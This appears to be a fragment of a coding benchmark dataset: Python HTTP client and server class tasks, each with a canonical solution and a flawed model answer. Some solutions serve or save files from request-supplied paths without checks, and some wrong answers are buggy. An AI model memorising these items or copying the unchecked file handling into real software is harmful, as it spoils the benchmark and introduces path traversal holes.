    "Instruction": "Task Description: Implement a class for handling HTTP requests to a server, supporting both GET and POST methods, with optional proxy support and response parsing capabilities.\n\nClass Description: WARequest is a class designed to facilitate HTTP communication with a server. It provides methods for sending GET and POST requests, handling response parsing, and managing request parameters and headers. The class supports both direct connections and proxy connections.\n\nAttributes:\n\npvars: [list] - List of variables that can be parsed from the response\nport: [int] - Port number for the HTTP connection (default: 443)\ntype: [str] - HTTP request type (GET or POST)\nparser: [ResponseParser] - Parser object for processing the response\nparams: [list] - List of tuples containing request parameters\nheaders: [dict] - Dictionary of HTTP headers to be sent with the request\nsent: [bool] - Flag indicating if the request has been sent\nresponse: [HTTPResponse] - The response object from the server\nurl: [str] - The target URL for the request\n\nMethods:\n\nsetParsableVariables: [setParsableVariables](pvars: list) -> None - Sets the list of variables that can be parsed from the response\naddParam: [addParam](name: str, value: str) -> None - Adds a parameter to the request\nremoveParam: [removeParam](name: str) -> None - Removes a parameter from the request\naddHeaderField: [addHeaderField](name: str, value: str) -> None - Adds a header field to the request\nclearParams: [clearParams]() -> None - Clears all request parameters\ngetUserAgent: [getUserAgent]() -> str - Returns the user agent string\nsend: [send](parser: ResponseParser = None) -> dict - Sends the request (GET or POST based on type) and returns parsed response\nsetParser: [setParser](parser: ResponseParser) -> None - Sets the response parser\ngetConnectionParameters: [getConnectionParameters]() -> tuple - Returns host, port, and path from the URL\nsendGetRequest: [sendGetRequest](parser: ResponseParser = None) -> dict - Sends a GET request and returns parsed response\nsendPostRequest: [sendPostRequest](parser: ResponseParser = None) -> dict - Sends a POST request and returns parsed response\nsendRequest: [sendRequest](host: str, port: int, path: str, headers: dict, params: list, reqType: str = \"GET\") -> HTTPResponse - Static method to send a direct HTTP request\nsendRequestWithProxy: [sendRequestWithProxy](host: str, port: int, path: str, headers: dict, params: list, proxy: HttpProxy) -> dict - Static method to send a request through a proxy\nbuild_get_url: [build_get_url](host: str, path: str, params: list) -> str - Static method to build a GET URL\nbuild_headers: [build_headers](headers_tuple: dict) -> list - Static method to convert headers dictionary to curl format",
    "Canonical_solution": "import urllib\nimport sys\nimport os\nimport logging\nfrom http import client as httplib\nfrom urllib.parse import urlencode\nfrom .httpproxy import HttpProxy\nfrom yowsup.env import YowsupEnv\n\nlogger = logging.getLogger(__name__)\n\nclass WARequest:\n    OK = 200\n\n    def __init__(self):\n        self.pvars = []\n        self.port = 443\n        self.type = \"GET\"\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        for i in range(0, len(self.params)):\n            if self.params[i][0] == name:\n                del self.params[i]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return YowsupEnv.getCurrent().getUserAgent()\n\n    def send(self, parser=None):\n        if self.type == \"POST\":\n            return self.sendPostRequest(parser)\n        return self.sendGetRequest(parser)\n\n    def setParser(self, parser):\n        if isinstance(parser, ResponseParser):\n            self.parser = parser\n        else:\n            logger.error(\"Invalid parser\")\n\n    def getConnectionParameters(self):\n        if not self.url:\n            return \"\", \"\", self.port\n\n        try:\n            url = self.url.split(\"://\", 1)\n            url = url[0] if len(url) == 1 else url[1]\n            host, path = url.split('/', 1)\n        except ValueError:\n            host = url\n            path = \"\"\n\n        path = \"/\" + path\n        return host, self.port, path\n\n    def sendGetRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta()\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        proxy = HttpProxy.getFromEnviron()\n        if proxy is None:\n            self.response = WARequest.sendRequest(host, port, path, headers, params, \"GET\")\n            if not self.response.status == WARequest.OK:\n                logger.error(\"Request not success, status was %s\" % self.response.status)\n                return {}\n\n            data = self.response.read()\n            logger.info(data)\n            self.sent = True\n            return parser.parse(data.decode(), self.pvars)\n        else:\n            logger.info(\"Request with proxy\")\n            self.response = WARequest.sendRequestWithProxy(host, port, path, headers, params, proxy)\n            logger.info(self.response)\n            return self.response\n\n    def sendPostRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta(),\n                           \"Content-Type\": \"application/x-www-form-urlencoded\"\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        self.response = WARequest.sendRequest(host, port, path, headers, params, \"POST\")\n\n        if not self.response.status == WARequest.OK:\n            logger.error(\"Request not success, status was %s\" % self.response.status)\n            return {}\n\n        data = self.response.read()\n        logger.info(data)\n        self.sent = True\n        return parser.parse(data.decode(), self.pvars)\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        params = urlencode(params)\n        path = path + \"?\" + params if reqType == \"GET\" and params else path\n\n        if len(headers):\n            logger.debug(headers)\n        if len(params):\n            logger.debug(params)\n\n        logger.debug(\"Opening connection to %s\" % host)\n        conn = httplib.HTTPSConnection(host, port) if port == 443 else httplib.HTTPConnection(host, port)\n\n        logger.debug(\"Sending %s request to %s\" % (reqType, path))\n        conn.request(reqType, path, params, headers)\n        response = conn.getresponse()\n        return response\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        import pycurl\n        import json\n        from io import BytesIO\n        logger.info(\"SENDING PROXY REQUEST WITH %s\" % proxy.getHost())\n        bytes_buffer = BytesIO()\n        c = pycurl.Curl()\n        c.setopt(pycurl.URL, WARequest.build_get_url(host, path, params))\n        c.setopt(pycurl.PROXY, proxy.getHost())\n        c.setopt(pycurl.PROXYPORT, proxy.getPort())\n        if proxy.getUserName() is not None:\n            c.setopt(pycurl.PROXYUSERPWD, \"%s:%s\" % (proxy.getUser(), proxy.getPassword()))\n        c.setopt(pycurl.PORT, port)\n        c.setopt(pycurl.HTTPHEADER, WARequest.build_headers(headers))\n        c.setopt(pycurl.WRITEDATA, bytes_buffer)\n        c.perform()\n        c.close()\n        data = bytes_buffer.getvalue().decode('utf-8')\n        return json.loads(data)\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        params = urlencode(params)\n        url = 'https://' + host + path + \"?\" + params\n        return url\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        headers_array = []\n        for idx in headers_tuple:\n            headers_array.append(idx + \":\" + headers_tuple[idx])\n        return headers_array",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport urllib.parse\nimport http.client\nimport json\n\nclass ResponseParser:\n    def parse(self, response):\n        raise NotImplementedError(\"Subclasses should implement this!\")\n\nclass WARequest:\n    def __init__(self, url, type=\"GET\"):\n        self.pvars = []\n        self.port = 443\n        self.type = type\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n        self.url = url\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        self.params = [param for param in self.params if param[0] != name]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return self.headers.get('User-Agent', 'WARequest/1.0')\n\n    def send(self, parser=None):\n        if parser:\n            self.setParser(parser)\n        host, port, path = self.getConnectionParameters()\n        if self.type == \"GET\":\n            return self.sendGetRequest()\n        elif self.type == \"POST\":\n            return self.sendPostRequest()\n\n    def setParser(self, parser):\n        self.parser = parser\n\n    def getConnectionParameters(self):\n        parsed_url = urllib.parse.urlparse(self.url)\n        host = parsed_url.hostname\n        port = parsed_url.port if parsed_url.port else self.port\n        path = parsed_url.path\n        return host, port, path\n\n    def sendGetRequest(self, parser=None):\n        if parser:\n            self.setParser(parser)\n        host, port, path = self.getConnectionParameters()\n        url = self.build_get_url(host, path, self.params)\n        headers = self.build_headers(self.headers)\n        response = self.sendRequest(host, port, url, headers, [])\n        self.response = response\n        self.sent = True\n        if self.parser:\n            return self.parser.parse(response)\n        return {}\n\n    def sendPostRequest(self, parser=None):\n        if parser:\n            self.setParser(parser)\n        host, port, path = self.getConnectionParameters()\n        headers = self.build_headers(self.headers)\n        response = self.sendRequest(host, port, path, headers, self.params, \"POST\")\n        self.response = response\n        self.sent = True\n        if self.parser:\n            return self.parser.parse(response)\n        return {}\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        conn = http.client.HTTPSConnection(host, port)\n        if reqType == \"GET\":\n            conn.request(reqType, path, headers=headers)\n        elif reqType == \"POST\":\n            encoded_params = urllib.parse.urlencode(params)\n            conn.request(reqType, path, body=encoded_params, headers=headers)\n        response = conn.getresponse()\n        return response.read().decode()\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        conn = http.client.HTTPSConnection(proxy.host, proxy.port)\n        full_url = f\"http://{host}:{port}{path}\"\n        if proxy.username and proxy.password:\n            auth_header = f\"{proxy.username}:{proxy.password}\"\n            headers['Proxy-Authorization'] = f\"Basic {auth_header.encode('base64').strip()}\"\n        conn.request(\"GET\", full_url, headers=headers)\n        response = conn.getresponse()\n        return response.read().decode()\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        query_string = urllib.parse.urlencode(params)\n        return f\"{path}?{query_string}\"\n\n    @staticmethod\n    def build_headers(headers_dict):\n        return {k: v for k, v in headers_dict.items()}\n\nclass JsonParser(ResponseParser):\n    def parse(self, response):\n        try:\n            return json.loads(response)\n        except json.JSONDecodeError:\n            return {}\n\nclass HttpProxy:\n    def __init__(self, host, port, username=None, password=None):\n        self.host = host\n        self.port = port\n        self.username = username\n        self.password = password\n```"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the `http.server` module to handle GET and POST requests, with custom response handling and error management.\n\nClass Description: The `YamlComposerHttp` class encapsulates an HTTP server that listens on a specified port and handles incoming GET and POST requests. It includes an inner class `_HttpServer` that extends `BaseHTTPRequestHandler` to define custom request handling logic.\n\nAttributes:\n\n- args: [object] - Configuration object containing server parameters, including the HTTP port to listen on.\n\nMethods:\n\n- __init__(args) -> None - Initializes the `YamlComposerHttp` instance with the provided configuration.\n  - Input: \n    - args: [object] - Configuration object containing server parameters.\n  - Output: None\n\n- run() -> None - Starts the HTTP server and begins listening for incoming requests indefinitely until interrupted.\n  - Input: None\n  - Output: None\n\nInner Class: _HttpServer(BaseHTTPRequestHandler)\n\nMethods:\n\n- _set_response(msg: str, code: int = 200) -> None - Helper method to send an HTTP response with the specified message and status code.\n  - Input:\n    - msg: [str] - The message to include in the response body.\n    - code: [int] - The HTTP status code (default: 200).\n  - Output: None\n\n- do_GET() -> None - Handles incoming GET requests. Responds with a default HTML page for the root path ('/') or an error for invalid paths.\n  - Input: None\n  - Output: None\n\n- do_POST() -> None - Handles incoming POST requests. Processes form data from '/generate' path or returns an error for invalid paths.\n  - Input: None\n  - Output: None",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n\n    class _HttpServer(BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200):\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self):\n            if str(self.path) != '/':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            self._set_response(self.default_html)\n\n        def do_POST(self):\n            if str(self.path) != '/generate':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            content_length = int(self.headers['Content-Length'])\n            data = self.rfile.read(content_length)\n            data = {k: v[0] for k, v in parse_qs(data.decode('utf-8')).items()}\n            self._set_response(*parse_http_data(data, self.args))\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.args.http_port), self._HttpServer)\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            httpd.server_close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport urllib.parse\n\nclass YamlComposerHttp:\n    class _HttpServer(http.server.BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200) -> None:\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self) -> None:\n            if self.path == '/':\n                response = \"<html><body><h1>Welcome to Yaml Composer</h1></body></html>\"\n                self._set_response(response)\n            else:\n                self._set_response(\"Error: Invalid path\", 404)\n\n        def do_POST(self) -> None:\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))\n\n            if self.path == '/generate':\n                # Example processing: just echo back the received data\n                response = f\"Received data: {parsed_data}\"\n                self._set_response(response)\n            else:\n                self._set_response(\"Error: Invalid path\", 404)\n\n    def __init__(self, args) -> None:\n        self.args = args\n        self.port = args.get('port', 8000)\n\n    def run(self) -> None:\n        with socketserver.TCPServer((\"\", self.port), self._HttpServer) as httpd:\n            print(f\"Serving HTTP on 0.0.0.0 port {self.port} (http://0.0.0.0:{self.port}/)...\")\n            try:\n                httpd.serve_forever()\n            except KeyboardInterrupt:\n                pass\n            httpd.server_close()\n            print(\"Server stopped.\")\n```"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server capable of handling POST requests to receive and process file uploads with metadata, then store the files locally and register them via an API.\n\nClass Description: HTTPPostHandler is a class that sets up an HTTP server to handle file uploads via POST requests. It processes JSON payloads containing file data (base64 encoded), metadata, and stores the decoded files in a specified directory while registering them through an external API.\n\nAttributes:\n- OUTPUT_DIR: str - The base directory where uploaded files will be stored\n- port: int - The port number on which the HTTP server will listen\n\nMethods:\n- __init__(output_dir: str = '', port: int = 80) -> None - Initializes the HTTPPostHandler with optional output directory and port parameters\n- run() -> None - Starts the HTTP server and begins listening for requests indefinitely\n\nNested Class: Handler (extends BaseHTTPRequestHandler)\nMethods:\n- _set_headers() -> None - Sets the HTTP response headers for successful requests\n- do_POST() -> None - Handles POST requests, processes the incoming file data and metadata, saves the file to disk, and registers it via API",
    "Canonical_solution": "import os\nimport sys\nimport json\nimport string\nimport random\nimport base64\nimport requests\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HTTPPostHandler:\n    def __init__(self, output_dir='', port=80):\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n\n    class Handler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_POST(self):\n            self._set_headers()\n            self.data_string = self.rfile.read(int(self.headers['Content-Length']))\n            self.send_response(200)\n            self.end_headers()\n\n            json_data = json.loads(self.data_string)\n            b64_data = json_data.get('data')\n            filetype = json_data.get('type')\n            owner = json_data.get('owner')\n            module = json_data.get('module')\n            session = json_data.get('session')\n            filename = json_data.get('filename')\n\n            data = base64.b64decode(b64_data)\n            if session.startswith('_b64'):\n                session = base64.b64decode(session[6:]).decode('ascii')\n\n            if not filetype.startswith('.'):\n                filetype = '.' + filetype\n\n            if not filename:\n                filename = str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]) + filetype\n\n            output_path = os.path.join(self.OUTPUT_DIR, owner, 'files', filename)\n\n            requests.post(\"http://0.0.0.0/api/file/add\", {\"filename\": filename, \"owner\": owner, \"module\": module, \"session\": session})\n\n            with open(output_path, 'wb') as fp:\n                fp.write(data)\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.port), self.Handler)\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport json\nimport base64\nimport os\nimport requests\n\nclass HTTPPostHandler:\n    def __init__(self, output_dir: str = '', port: int = 80) -> None:\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n        if not os.path.exists(self.OUTPUT_DIR):\n            os.makedirs(self.OUTPUT_DIR)\n\n    def run(self) -> None:\n        with socketserver.TCPServer((\"\", self.port), self.Handler) as httpd:\n            print(f\"Serving at port {self.port}\")\n            httpd.serve_forever()\n\n    class Handler(http.server.BaseHTTPRequestHandler):\n        def _set_headers(self) -> None:\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n\n        def do_POST(self) -> None:\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            data = json.loads(post_data.decode('utf-8'))\n\n            file_data = data.get('file_data')\n            metadata = data.get('metadata')\n\n            if file_data and metadata:\n                file_name = metadata.get('file_name')\n                file_path = os.path.join(self.server.server_address[0], self.server.server_address[1], file_name)\n                with open(file_path, 'wb') as f:\n                    f.write(base64.b64decode(file_data))\n\n                self.register_file(metadata)\n\n            self._set_headers()\n            self.wfile.write(json.dumps({\"status\": \"success\"}).encode('utf-8'))\n\n        def register_file(self, metadata: dict) -> None:\n            # Example API registration\n            api_url = 'http://example.com/register'\n            response = requests.post(api_url, json=metadata)\n            if response.status_code != 200:\n                print(f\"Failed to register file: {response.text}\")\n\nif __name__ == '__main__':\n    handler = HTTPPostHandler(output_dir='uploads', port=8080)\n    handler.run()\n```"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server to serve static files (CSS, JavaScript, and images) with proper content types and error handling.\n\nClass Description: PVEDiscordDarkServer is a class that creates an HTTP server to serve static web resources including CSS files, JavaScript files, and various image formats (PNG, JPG, JPEG, SVG). It handles different file types with appropriate content headers and provides error responses for missing files or unsupported requests.\n\nAttributes:\nPORT: int - The port number on which the HTTP server will run\nDIR_SASS: str - The directory path containing CSS files\nDIR_IMAGES: str - The directory path containing image files\nDIR_JS: str - The directory path containing JavaScript files\n\nMethods:\n__init__(port=3000) -> None - Initializes the server with the specified port (default: 3000) and sets up directory paths for static files\nrun() -> None - Starts the HTTP server and begins serving requests indefinitely until interrupted\nRequestHandler: class - Inner class that handles HTTP requests (inherits from BaseHTTPRequestHandler)\n    __init__(*args, **kwargs) -> None - Initializes the request handler with directory paths\n    log_message(format, *args) -> None - Overrides default logging to suppress log messages\n    _set_headers(status, type) -> None - Helper method to set HTTP response headers\n    do_GET() -> None - Handles GET requests, serves appropriate files with correct content types, or returns error responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nimport os\n\nclass PVEDiscordDarkServer:\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = os.path.join(os.path.dirname(__file__), \"sass\")\n        self.DIR_IMAGES = os.path.join(os.path.dirname(__file__), \"images\")\n        self.DIR_JS = os.path.join(os.path.dirname(__file__), \"js\")\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = kwargs.pop('DIR_SASS')\n            self.DIR_IMAGES = kwargs.pop('DIR_IMAGES')\n            self.DIR_JS = kwargs.pop('DIR_JS')\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header(\"Content-type\", type)\n            self.end_headers()\n\n        def do_GET(self):\n            status = 200\n            type = \"application/json\"\n            data = None\n\n            file = self.path.rpartition(\"/\")[2]\n            ext = file.rpartition(\".\")[2]\n\n            if ext == \"css\":\n                data = open(os.path.join(self.DIR_SASS, \"PVEDiscordDark.css\"), \"rb\").read()\n                type = \"text/css\"\n            elif ext == \"js\":\n                data = open(os.path.join(self.DIR_JS, \"PVEDiscordDark.js\"), \"rb\").read()\n                type = \"application/javascript\"\n            elif ext in (\"png\", \"jpg\", \"jpeg\"):\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/{ext}\"\n                except FileNotFoundError:\n                    status = 404\n            elif ext == \"svg\":\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/svg+xml\"\n                except FileNotFoundError:\n                    status = 404\n            else:\n                status = 400\n            self._set_headers(status, type)\n            if status == 200:\n                self.wfile.write(data)\n            else:\n                self.wfile.write(json.dumps({\"error\": status}).encode())\n\n    def run(self):\n        print(f\"Serving on localhost:{self.PORT}\")\n        server = HTTPServer(\n            server_address=(\"\", self.PORT),\n            RequestHandlerClass=lambda *args, **kwargs: self.RequestHandler(\n                *args,\n                DIR_SASS=self.DIR_SASS,\n                DIR_IMAGES=self.DIR_IMAGES,\n                DIR_JS=self.DIR_JS,\n                **kwargs\n            )\n        )\n        try:\n            server.serve_forever()\n        except KeyboardInterrupt:\n            quit()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport os\n\nclass PVEDiscordDarkServer:\n    PORT = 3000\n    DIR_SASS = 'static/css'\n    DIR_IMAGES = 'static/images'\n    DIR_JS = 'static/js'\n\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.handler = self.RequestHandler\n        self.handler.DIR_SASS = self.DIR_SASS\n        self.handler.DIR_IMAGES = self.DIR_IMAGES\n        self.handler.DIR_JS = self.DIR_JS\n\n    def run(self):\n        with socketserver.TCPServer((\"\", self.PORT), self.handler) as httpd:\n            print(f\"Serving at port {self.PORT}\")\n            httpd.serve_forever()\n\n    class RequestHandler(http.server.BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            pass\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header('Content-type', type)\n            self.end_headers()\n\n        def do_GET(self):\n            if self.path.startswith('/css'):\n                path = os.path.join(self.DIR_SASS, self.path[1:])\n                content_type = 'text/css'\n            elif self.path.startswith('/images'):\n                path = os.path.join(self.DIR_IMAGES, self.path[1:])\n                ext = os.path.splitext(path)[1].lower()\n                if ext == '.png':\n                    content_type = 'image/png'\n                elif ext == '.jpg' or ext == '.jpeg':\n                    content_type = 'image/jpeg'\n                elif ext == '.svg':\n                    content_type = 'image/svg+xml'\n                else:\n                    self._set_headers(404, 'text/plain')\n                    self.wfile.write(b\"File not found\")\n                    return\n            elif self.path.startswith('/js'):\n                path = os.path.join(self.DIR_JS, self.path[1:])\n                content_type = 'application/javascript'\n            else:\n                self._set_headers(404, 'text/plain')\n                self.wfile.write(b\"File not found\")\n                return\n\n            try:\n                with open(path, 'rb') as file:\n                    self._set_headers(200, content_type)\n                    self.wfile.write(file.read())\n            except FileNotFoundError:\n                self._set_headers(404, 'text/plain')\n                self.wfile.write(b\"File not found\")\n\n# Example usage:\n# server = PVEDiscordDarkServer()\n# server.run()\n```"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for sharing and viewing log files from a specified directory. The server should handle GET requests to display available log files and serve their contents.\n\nClass Description: The LogServer class creates an HTTP server that serves log files from a specified directory. It uses a custom request handler (LogSharedHandler) to process HTTP requests and serve either a directory listing or file contents.\n\nAttributes:\n- log_path: str - The directory path where log files are stored\n- port: int - The port number on which the HTTP server will listen\n- httpd: Optional[HTTPServer] - The HTTP server instance (None until started)\n\nMethods:\n- __init__(log_path: str, port: int) -> None - Initializes the LogServer with the specified log directory path and port number\n- start() -> None - Starts the HTTP server on 0.0.0.0 (all interfaces) using the specified port and serves requests indefinitely\n\nThe LogSharedHandler (inner class) handles HTTP requests with these methods:\n- do_GET() -> None - Processes GET requests:\n  - For root path (\"/\"), returns an HTML page listing all available log files as clickable links\n  - For specific file paths, returns the content of the requested log file\n  - Returns 404 if requested file doesn't exist",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport os\nfrom typing import Optional\n\nclass LogSharedHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        log_path = os.getenv('LOG_PATH')\n        if self.path == \"/\":\n            html = \"<html><body>\"\n            for f in os.listdir(log_path):\n                html += f\"<p><a href=\\\"{f}\\\">{f}</a></p>\"\n            html += \"</body></html>\"\n\n            self.send_response(200)\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(html.encode())\n        else:\n            p = log_path + self.path\n            try:\n                with open(p, \"rb\") as file:\n                    self.send_response(200)\n                    self.send_header(\"Content-type\", \"text/plain\")\n                    self.end_headers()\n                    self.wfile.write(file.read())\n            except FileNotFoundError:\n                self.send_error(404, \"File not found\")\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int):\n        self.log_path = log_path\n        self.port = port\n        self.httpd: Optional[HTTPServer] = None\n\n    def start(self):\n        self.httpd = HTTPServer(('0.0.0.0', self.port), LogSharedHandler)\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport os\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom urllib.parse import unquote\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int) -> None:\n        self.log_path = log_path\n        self.port = port\n        self.httpd = None\n\n    def start(self) -> None:\n        self.httpd = HTTPServer(('0.0.0.0', self.port), LogSharedHandler)\n        self.httpd.serve_forever()\n\n    class LogSharedHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.log_path = args[0].server.log_path\n            super().__init__(*args, **kwargs)\n\n        def do_GET(self) -> None:\n            if self.path == '/':\n                self.send_response(200)\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n                files = [f for f in os.listdir(self.log_path) if os.path.isfile(os.path.join(self.log_path, f))]\n                html = '<html><body><h1>Available Log Files</h1><ul>'\n                for file in files:\n                    html += f'<li><a href=\"/{file}\">{file}</a></li>'\n                html += '</ul></body></html>'\n                self.wfile.write(html.encode('utf-8'))\n            else:\n                file_path = os.path.join(self.log_path, unquote(self.path.lstrip('/')))\n                if os.path.exists(file_path) and os.path.isfile(file_path):\n                    self.send_response(200)\n                    self.send_header('Content-type', 'text/plain')\n                    self.end_headers()\n                    with open(file_path, 'rb') as file:\n                        self.wfile.write(file.read())\n                else:\n                    self.send_error(404, \"File not found\")\n\n# Example usage:\n# server = LogServer('/path/to/logs', 8000)\n# server.start()\n```"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for resolving secret hashes to their corresponding secrets, specifically designed for XUD (Cross-chain Unidirectional Payment Channel) resolution.\n\nClass Description: The XUDResolver class is an HTTP server that handles POST requests containing secret hashes and responds with the corresponding secret if the hash matches a predefined secret. It uses Python's http.server module to create a simple HTTP server.\n\nAttributes:\n- host: str - The host address where the server will run (default: \"localhost\")\n- port: int - The port number for the server (default: 8000)\n- x_secret: str - A predefined secret in hexadecimal format\n- x_secret_hash: str - The SHA-256 hash of the predefined secret\n\nMethods:\n- __init__(host: str = \"localhost\", port: int = 8000) -> None - Initializes the XUDResolver with optional host and port parameters\n- resolve(request: dict) -> dict or None - Takes a request dictionary containing a \"secrethash\" and returns the corresponding secret if the hash matches, otherwise returns None\n- serve() -> None - Starts the HTTP server with a custom request handler that processes POST requests for secret resolution",
    "Canonical_solution": "import json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom hashlib import sha256\nfrom eth_utils import to_bytes, to_hex\n\nclass XUDResolver:\n    def __init__(self, host=\"localhost\", port=8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"0x2ff886d47b156de00d4cad5d8c332706692b5b572adfe35e6d2f65e92906806e\"\n        self.x_secret_hash = to_hex(sha256(to_bytes(hexstr=self.x_secret)).digest())\n\n    def resolve(self, request):\n        if \"secrethash\" not in request:\n            return None\n\n        if request[\"secrethash\"] == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self):\n        class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n            def __init__(self, *args, **kwargs):\n                self.resolver = kwargs.pop('resolver')\n                super().__init__(*args, **kwargs)\n\n            def do_POST(self):\n                try:\n                    content_len = int(self.headers.get(\"Content-Length\"))\n                    body = self.rfile.read(content_len)\n\n                    preimage = self.resolver.resolve(json.loads(body.decode(\"utf8\")))\n                    if preimage is None:\n                        self.send_response(404)\n                        self.end_headers()\n                    else:\n                        response = to_bytes(text=json.dumps(preimage))\n                        self.send_response(200)\n                        self.end_headers()\n                        self.wfile.write(response)\n                except BaseException:\n                    self.send_response(400)\n                    self.end_headers()\n\n        httpd = HTTPServer((self.host, self.port), lambda *args, **kwargs: SimpleHTTPRequestHandler(*args, resolver=self, **kwargs))\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
